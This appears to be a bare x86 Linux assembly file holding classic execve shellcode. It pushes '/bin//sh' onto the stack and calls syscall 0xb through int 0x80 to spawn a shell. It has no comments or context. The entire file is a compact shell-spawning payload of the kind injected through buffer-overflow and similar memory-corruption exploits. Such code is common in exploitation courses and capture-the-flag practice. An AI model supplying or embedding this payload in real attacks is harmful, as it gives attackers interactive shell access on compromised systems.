.section .text
	.globl _start
_start:

	        xor  %eax, %eax
	        push %eax
	        push $0x68732f2f
	        push $0x6e69622f
	        mov  %esp, %ebx

	        push %eax
	        mov  %esp, %ecx

	        push %ebx
	        mov  %eax, %edx
	        mov  $0xb, %al

	        int  $0x80
